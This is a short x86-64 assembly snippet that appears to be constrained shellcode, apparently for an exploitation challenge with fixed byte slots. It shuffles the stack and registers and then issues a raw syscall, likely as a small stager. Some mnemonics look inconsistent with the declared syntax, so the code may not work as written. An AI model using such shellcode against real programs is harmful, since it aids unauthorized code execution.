.intel_syntax noprefix

.text
	.globl main

// only have: 5 bytes, then 4 bytes, then 9 bytes, then 8 bytes
main:
	leaq rsp, [rip+0x02cc0202]
next:	
	movb dl,0x40
	or  ah, cl
	sub rsp, 0x2cc0202-(last-next)
	nop	
	or  ah, cl
	add rsi,rsp
	movb spl, 0xff
	syscall
last:
	nop
